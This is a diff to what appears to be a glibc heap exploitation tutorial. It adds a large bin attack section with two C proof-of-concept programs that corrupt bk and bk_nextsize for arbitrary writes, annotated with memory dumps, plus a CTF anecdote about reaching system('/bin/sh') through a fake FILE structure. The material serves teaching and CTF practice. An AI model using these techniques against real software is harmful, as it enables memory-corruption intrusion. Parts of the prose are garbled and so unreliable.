@@ -469,11 +469,12 @@ is pushed into tcache.
         to the user and the remainder will be pushed to the unsorted bin.
         The last freed chunk will be put between the head and the last freed chunk.
 
-   3.2) Small bins (indexes 2 - 63) - store exact size classes from 16 bytes
+   3.2) Small bins (indexes 2 - 63) - store exact size classes from 32 bytes (on x86_64)
         to 512 bytes (on 64-bit arch, step 16 bytes). If the tcache bin for a
         specific size is full (default max 7 chunks), the excess chunks are
-        evicted and pushed to the corresponding small bin. Structure is a FIFO
-        doubly linked list. All chunks in one small bin have exactly the same size,
+        evicted and pushed to the unsorted bin and them corresponding small bin. 
+        Structure is a FIFO doubly linked list. 
+        All chunks in one small bin have exactly the same size,
         so allocation returns the first chunk without splitting. They will be used
         only if an exact match is required (small bins don't separate).
 
@@ -725,6 +726,340 @@ And the memory dump :
 	Better make this with spread to pinch valid chunk beetween victims and probably according a programm logic
 	with a next allocation you can fill that area as whole chunk to overwrite fd & bk of pinched chunk to trigger fastbin/tcache poisoning.
 	Or you can get uaf primitive because 1st victim still not freed for allocator and it opens a way to unsorted bin attack, for example.
+	
+4.8 Large bin attack
+------------------------------------------------------------------------------
+
+Concept of this technique is UAF to overwrite bk & bk_nextsize in the head-chunk of large bin to put heap address arbitrary via new head/tail insertion.
+This vulnerability was pathced in 2.30 but still pwnable. We'll consider both versions.
+
+glibc < 2.30 :
+
+	My PoCs :
+	
+		Tail insertion :
+		
+			#include <stdlib.h>                                                                                                 
+                                                                                                                    
+			int main() {             
+				/* alloc 0x10 - layers to bypass consolidation */                                                                                           
+				char* a = malloc(0x100); malloc(0x10);                                                               
+				char* b = malloc(0x480); malloc(0x10);                                                                      
+				char* c = malloc(0x470); malloc(0x10);                                                                      
+					
+				/* unsorted bin dummy to bypass future large bin chunks separation */	                                                                                            
+				free(a);
+				
+				free(b); 
+				malloc(0x10); 
+				free(c);                                                                                                    
+						                                                                                            
+				long val = 0x602300; // target                                                                          
+						      
+				/* VULN */                                                                                      
+				*((long*)b + 3) = val - 0x20;                                                                                
+
+				malloc(0x10);                                                                                       
+			}
+			
+		Head insertion :
+		
+			#include <stdlib.h>                                                                                                 
+                                                                                                                    
+			int main() {                                                                                                        
+				char* a = malloc(0x100); malloc(0x10);                                                                      
+				char* b = malloc(0x470); malloc(0x10);                                                                      
+				char* c = malloc(0x480); malloc(0x10);                                                                      
+						                                                                                            
+				free(a);
+				free(b); 
+				malloc(0x10); 
+				free(c);                                                                                                    
+						                                                                                            
+				long val1 = 0x602300; // target 1
+				long val2 = 0x602310; // target 2                                                                      
+						      
+				/* VULN */    
+				*((long*)b + 1) = val1 - 0x10;
+				*((long*)b + 3) = val2 - 0x20;                                                                                
+
+				malloc(0x10);                                                                                                 
+			}
+			
+	Firstly, look at the logic of the large bin chunk insertion and understand bin statement for each action.
+	p.s. I'll show link at schemas as "->" (fd) and "<-" (bk)
+	
+		1. Chunks at large bins can store chunks with determinated range of size : 
+			- from 64-th to 95-th bin (0-th - 32-nd large bin) bins have 64 bytes range :
+				0: 0x400 - 0x43f
+				1: 0x440 - 0x47f
+				...
+		2. Any bin has fwd (pointer to the head of double-linked list) and bck (pointer to the tail).
+		   They equal < current main_arena address - 0x10 > :
+		   
+		   	64-th bin : 	0x7ffff7dd1f78: 0x00007ffff7dd1f68      0x00007ffff7dd1f68
+			65-th bin : 	0x7ffff7dd1f88: 0x00007ffff7dd1f78      0x00007ffff7dd1f78
+						
+		   Because with this arch fd & bk field don't miss "forward & backward pointers semantic"
+		   So, address of 65-th bin is 0x00007ffff7dd1f78 and fwd/bck pointers as head can be taken via 
+		   
+		   	fwd <=> 0x00007ffff7dd1f78->fd <=> *(0x00007ffff7dd1f78 + 0x10) <=> head
+		   	bck <=> 0x00007ffff7dd1f78->bk <=> *(0x00007ffff7dd1f78 + 0x18) <=> tail
+		   	
+		3. When large bin is empty and allocator moves chunk from unsorted bin to this bin it does following thins :
+		
+			3.1. Makes correct cyclic double-linked list of chunks by fd/bk with sorting from larger to smaller :
+				- For the first chunk it puts address of this chunk to fwd & bck
+				- It also puts current large bin address to fd/bk field of this chunk
+					
+					<large bin> <-> chunk1 <-> <large bin>
+			
+			3.2. Makes correct cyclic double-linked list of chunks by fd_nextsize/bk_nextsize relying on "size" fields.
+				- Make "ringed" double-linked list on this chunk because only this chunk at the bin yet
+				  * head->bk_nextsize <=> the smallest chunk at the bin <=> tail
+				  * tail->fd_nextsize <=> the largest chunk at the bin <=> head
+				
+					... <-> chunk1 <-> chunk1 <-> chunk1 <-> ...
+			
+			The whole image : 
+					
+				0x602130:       0x0000000000000000      0x0000000000000481
+						     prev_size		   size & flags
+				0x602140:       0x00007ffff7dd1f88      0x00007ffff7dd1f88
+							fd			bk
+				0x602150:       0x0000000000602130      0x0000000000602130
+						    fd_nextsize		    bk_nextsize
+						    
+			And main arena large bin :
+			
+				0x7ffff7dd1f98: 0x0000000000602130      0x0000000000602130
+
+			As you can see, now chunk1 is the head and the tail (fwd & bck points to chunk1)
+			
+		4. When large bin already includes one chunk :
+			
+			4.1. First of all, allocator executing macro which determine : is chunk larger/smaller than current head/tail?
+			     This something like optimization to do one operation O(1) before traversal whole bin O(n) instead immediately traversal.
+			     
+			4.2. Chunk smaller that tail :
+			
+				It means that this chunk the smallest chunk of the bin and it must become new tail.
+				And allocator resolves two double-linked lists to link chunks properly :
+				
+					4.2.1. fd_nextsize/bk_nextsize linking :
+					
+						As you can see at the 3.2. head's bk_nextsize points to tail and tail's fd_nextsize points to head :
+						
+							 --> HEAD (fwd) <-> A <-> B <-> C <-> TAIL (bck) <--
+							 |_________________________________________________|
+							 
+						p.s. this image just for better imagination of cyclic double-linked list;
+						     if bin has just one chunk, this chunk already as HEAD as TAIL.
+							 
+						And allocator executes this code (P is our chunk):
+						
+							P->fd_nextsize = fwd;			<== The smallest chunk (NEW TAIL) points to HEAD with fd_nextsize
+							P->bk_nextsize = fwd->bk_nextsize;	<== And to OLD TAIL (HEAD->bk_nextsize == OLD TAIL) with bk_nextsize
+							fwd->bk_nextsize = P;			<== Now HEAD points to NEW TAIL with bk_nextsize
+							P->bk_nextsize->fd_nextsize = P; 	<== Finally, OLD TAIL points to NEW TAIL with fd_nextsize
+
+							 --> HEAD (fwd) <-> A <-> B <-> C <-> OLD TAIL (still bck yet) <-> NEW TAIL <--
+							 |____________________________________________________________________________|
+							 
+						The image in our case :
+						
+							before :					after :
+							
+								--> HEAD (fwd) & OLD TAIL (bck) <--		--> HEAD (fwd) (OLD TAIL) <-> NEW TAIL (bck) <--
+							 	|_________________________________|		|______________________________________________|
+							 	
+					4.2.2. fd/bk linking :
+					
+						Fine, after resolving nextsize cycle allocator resolves fd/bk cycle.
+						As you can see at the 3.1, bk of head and fd of tail point to large bin address.
+						So, when we try to put the smallest chunk to the bin it must become a new tail.
+						Now allocator redefines fwd & bck :
+						
+							fwd = <large bin address>	<== main_arena address
+							bck = fwd->bck			<== old tail address
+							
+						And does this :
+						
+							P->fd = fwd;			<== NEW TAIL point to main arena with fd
+							P->bk = bck;			<== and points to OLD TAIL with bk
+							bck->fd = P;			<== OLD TAIL point to NEW TAIL with fd
+							fwd->bk = P;			<== !! UPDATE !! TAIL at the bin (now bck from 4.2.1. is NEW TAIL)
+							
+						It looks like :
+						
+							<large bin> <-> HEAD (OLD TAIL) <-> NEW TAIL <-> <large bin>
+						
+				And look at the memory :
+				
+					before :
+					
+						heap :
+						
+							< single chunk in large bin (HEAD & TAIL) >
+							0x602130:       0x0000000000000000      0x0000000000000491
+							0x602140:       0x00007ffff7dd1f88      0x00007ffff7dd1f88	<== ringed by fd/bk on main_arena
+							0x602150:       0x0000000000602130      0x0000000000602130	<== ringed by fd/bk_nextsize on itself
+								
+							< the next chunk (in unsorted bin yet) >
+							0x6025d0:       0x0000000000000000      0x0000000000000481	<== smaller that the first 
+							0x6025e0:       0x0000000000602020      0x00007ffff7dd1b78
+							0x6025f0:       0x0000000000000000      0x0000000000000000	
+						
+						main arena : 
+						
+							< 66-th bin aka 2-th large bin >
+							0x7ffff7dd1f98: 0x0000000000602130      0x0000000000602130	<== fwd == bck == single chunk
+							
+					after :
+					
+						heap :
+						
+							< HEAD & OLD_TAIL >
+							0x602130:       0x0000000000000000      0x0000000000000491
+							0x602140:       0x00000000006025e0      0x00007ffff7dd1f88	<== fd points to TAIL & bk points to bin
+							0x602150:       0x00000000006025e0      0x00000000006025e0	<== fd/bk_nextsize ringed on NEW TAIL (look 4.2.1. "after")
+							
+							< NEW TAIL >
+							0x6025e0:       0x0000000000000000      0x0000000000000481
+							0x6025f0:       0x00007ffff7dd1f88      0x0000000000602130	<== fd points to bin & bk points to OLD TAIL (also HEAD)
+							0x602600:       0x0000000000602130      0x0000000000602130	<== also ringed on HEAD (also OLD TAIL)
+							
+						main arena :
+							< 66-th bin aka 2-th large bin >
+							0x7ffff7dd1f98: 0x0000000000602130      0x00000000006025e0	<== now fwd is HEAD and bck is updated TAIL
+			
+				Well done. Now I advise you to compile "Tail inserion PoC" without vuln and run it with gdb to check out my explanation step-by-step.
+							
+			4.3. Chunk larger that head :
+			
+				4.3.1. fd_nextsize/bk_nextsize linking :
+				
+					It means that new chunk must be the new head. Our mission actually is do double-linking list statement like this :
+					
+						--> NEW HEAD <-> OLD HEAD (still fwd yet) <-> A <-> B <-> C <-> TAIL (bck) <--
+						|____________________________________________________________________________|
+					
+					But allocator just executes those 4 strings of code from 4.2.1. because logic of CYCLIC double-linked list matches that method.
+					Let's check it out :
+						
+						1. Link NEW HEAD with OLD HEAD with fd_nextsize (P->fd_nextsize = fwd)
+						2. Link NEW HEAD with TAIL with bk_nextsize (P->bk_nextsize = fwd->bk_nextsize)
+						3. Link OLD HEAD with NEW HEAD with bk_nextsize (fwd->bk_nextsize = P)
+						4. Link TAIL with NEW HEAP with fd_nextsize (P->bk_nextsize->fd_nextsize = P)
+						
+					Here we are! New head successfully was linked to the bin.
+					
+				4.3.2. fd/bk linking :
+				
+					So, we still can use that code from 4.2.3. :) but with small fix : we want to put new chunk to tail 
+					it means that it's bk will points to bin and fd will points to old head.
+					And allocator turnes fwd and bck into :
+					
+						fwd = <large bin address>->fd;		<== fwd points to the old head
+						bck = fwd->bk;				<== bck points to the bin (head->bk == <large bin address>)
+						
+					And let's execute it together :
+					
+						1. Link NEW HEAD with OLD HEAD with fd (P->fd = fwd)
+						2. Link NEW HEAD with BIN with bk (P->bk = bck)
+						3. Link OLD HEAD with NEW HEAD with bk (fwd->bk = P)
+						4. Link BIN with NEW HEAD <=> update fwd (bck->fd = P)
+						
+				Fine. I also advise you to compile PoC but now for "Head insertion" and research it via gdb.
+				
+	OK, we actually get to understand vulnerability and exploit it!
+	Let's also consider two ways :
+	
+		5. exploit tail insertion to reach once arbitrary write of heap address :
+		
+			If we have vuln (UAF/heap overflow/another arbitrary write) which helps us to put arbitrary address to fwd->bk_nextsize
+			we can put address of new tail threre (just put target - 0x20 to shot into fd_nextsize field) :
+			
+				*((long*)b + 3) = val - 0x20;		<== now fwd->bk_nextsize = target - 0x20
+			
+			And look at 4.2.1. we can find : 
+				
+				P->bk_nextsize = fwd->bk_nextsize;	<== And to OLD TAIL (HEAD->bk_nextsize == OLD TAIL) with bk_nextsize
+				
+			It means that allocator trust to head's bk_nextsize (pointer to tail) and links new tail with old tail with bk_nextsize.
+			And 1 string of code later :
+			
+				P->bk_nextsize->fd_nextsize = P; 	<== Finally, OLD TAIL points to NEW TAIL with fd_nextsize
+				
+			Where P->bk_nextsize == target - 0x20. It means that *(target - 0x20 + <fd_nextsize offset>) becomes P.
+			That's all about tail insertion :)
+			
+			And memory dump :
+			
+				< HEAD (OLD TAIL) >
+				0x602130:       0x0000000000000000      0x0000000000000491
+				0x602140:       0x00000000006025e0      0x00007ffff7dd1f88
+				0x602150:       0x0000000000602130      0x00000000006025e0	<== bk_nextsize points to new tail
+				
+				< NEW TAIL >
+				0x6025e0:       0x0000000000000000      0x0000000000000481
+				0x6025f0:       0x00007ffff7dd1f88      0x0000000000602130
+				0x602600:       0x0000000000602130      0x00000000006022f0	<== bk_nextsize points to target - 0x20
+				
+				< target >
+				0x602310:       0x00000000006025e0
+				
+				< large bin >
+				0x7ffff7dd1f98: 0x0000000000602130      0x00000000006025e0	<== new tail at bck
+
+			As you can see allocator successfully takes out overwritten bk_nextsize and linked NEW TAIL with "FAKE OLD TAIL" via bk_nextsize
+			
+		6. exploit head insertion to reach once arbitrary write of heap address :
+		
+			It almost like previous but here we can write the same value (address of new head) to two arbitrary addresses
+			because this manipulation from allocator just trust head's bk (4.3.2.): 
+			
+				fwd = <large bin address>->fd;		<== fwd points to the old head
+				bck = fwd->bk;				<== bck points to the bin (head->bk == <large bin address>)
+				
+			And if we do this :
+				
+				*((long*)b + 1) = val1 - 0x10;		<== fwd->bk = target - 0x10
+				*((long*)b + 3) = val2 - 0x20;
+				
+			Allocator will overwrite our target instead of fwd at the large bin address at : 
+			
+				bck->fd = P;				<== OLD TAIL point to NEW TAIL with fd
+				
+			And just like at point 5. head insertion will overwrite the second target to address of new head.
+			
+			Memory dump :
+			
+				< OLD HEAD >
+				0x602130:       0x0000000000000000      0x0000000000000481
+				0x602140:       0x00007ffff7dd1f88      0x00000000006025d0
+				0x602150:       0x0000000000602130      0x00000000006025d0
+				
+				< NEW HEAD > 
+				0x6025d0:       0x0000000000000000      0x0000000000000491
+				0x6025e0:       0x0000000000602130      0x00000000006022f0
+				0x6025f0:       0x0000000000602130      0x00000000006022f0
+				
+				< targets >
+				0x602300:       0x00000000006025d0      0x0000000000000000
+				0x602310:       0x00000000006025d0      0x0000000000000000
+				
+				< large bin >
+				0x7ffff7dd1f98: 0x0000000000602130      0x0000000000602130
+				
+			So, allocator really didn't touch bck->fd, but twice write addresses of new head to targets.
+			
+	Fine. As you can see, the first way provides once writing at an arbitrary address but it more stealthy (double linked lists not corrupted too much).
+	And the second way provides double writing at arbitrary addresses, but corrupts fwd/bck at the large bin.
+	
+glibc >= 2.30 :
+
+	Coming soon ...
 
 ================================================================================
 5. FILE-STREAM ORIENTED PROGRAMMING
@@ -962,14 +1297,14 @@ Let me show you an example :
 		0x7ffff7bc460d <_IO_2_1_stderr_+205>:   0x0000000000000000      0xfff7bc26e0000000
 		0x7ffff7bc461d <_IO_2_1_stderr_+221>:   0x00fbad288700007f      0xfff7bc46a3000000
 	
-	Now (if we wanna get libc leak) we interested at overwrite flags with _IO_IS_APPENDING & _IO_CURRENTLY_PUTTING and write_ptr to any address which includes libc address
+	Now (if we wanna get libc leak) we interested at overwrite flags with _IO_IS_APPENDING & _IO_CURRENTLY_PUTTING and write_base to any address which includes libc address
 	As you can see, now the statement of stdout is : "print bytes from 0x7ffff7bc46a3 to 0x7ffff7bc46a3"
 	But we'll turn it into : "print bytes from <addr> to 0x7ffff7bc46a3 immediately when stdout will be used"
 	And because this attack is blind we'll do the partial overwrite at the 0x7ffff7bc4640 with 1 bytes
 	For example 0x20 to print all _IO_2_1_stdout_ data where we can leak 0x00007ffff7bc46a3 ptrs from libc 
 	or steal stdin address from __chain field at 0x7ffff7bc4688.
 	
-	And this is the layour after overwriting :
+	And this is the layout after overwriting :
 	
 		0x7ffff7bc4620 <_IO_2_1_stdout_>:       0x00000000fbad1887      0x0000000000000000
 		0x7ffff7bc4630 <_IO_2_1_stdout_+16>:    0x0000000000000000      0x0000000000000000
@@ -1563,7 +1898,32 @@ allocator will align it downward and you'll get a way to fill "prev_size" field 
 	If a process does something like "put null byte after reading/copying" (sprintf, strcpy, strdup for example) 
 	you can overwrite "size" field and get a way to reach overlapping chunks or something else (topchunk size control)
 	
-6.13 Polymorphic shellcode
+6.13 malloc_consolidate()
+------------------------------------------------------------------------------
+
+When process uses functions such as localtime() or another wich requires large chunk to store _IO_FILE_plus or smth else
+glibc allocator can trigger malloc_consolidate to clear fastbins via movement all chunks from there to the unsorted bin.
+It means that you probably miss fastbin dup via double-free / fastbin poisoning via uaf because when upper functions will be called
+fd / bk of chunks will be overwitten by main_arena addresses. And it actually has two sides.
+
+I faced with it during solve CAOV from pwnable.tw. That was the first time when I decided to up 2.23ubuntu5 environment 
+because binary required libstdc++ & libgcc_s & libm.
+
+So, when I tried to do fastbin poisoning via uaf and called function which called localtime(), allocator tried to move evil chunk to unsorted bin
+and fell because it didn't find properly header of the down chunk. Debug has taken 2 days and I decided to find another way to solve chall.
+And not just fall back ant try to find another way to get arbitrary write primitive - I tried to use malloc_consolidate against itself.
+
+That function takes all sizes to unsorted bin and that means I can move evil chunk to smallbins[4] (address + 0x68 from unsorted_chunks <=> __chain of FILE) 
+with my fake _IO_FILE_plus struct and via unsorted bin attack overwrite _IO_list_all to unsorted_chunks.
+And via triggering __overflow (write_ptr > write_base) got a system( _flags ) from fake_vtable where _flags = b'/bin/sh\x00'
+
+But if you work with newer versions of libc (2.24 <= when vtable_validate or 2.29 <= when unsorted bin patched) you can find another vector to pwn it. 
+For example - smallbin attack or largebin attack after unsorted unlink or any tricky way with tcache.
+
+So, after 3.5 days of brainstorm with malloc_consolidate I understand that my environment was a bit "incorrect" xD
+Binary from server had another logic of localtime as I know - it didn't trigger malloc_consolidate almost at all and solution was much easier.
+	
+6.14 Polymorphic shellcode
 ------------------------------------------------------------------------------
 
 So, I'm not sure that you can be faced with this case at new tasks but I was faced and I can't don't explain it :)
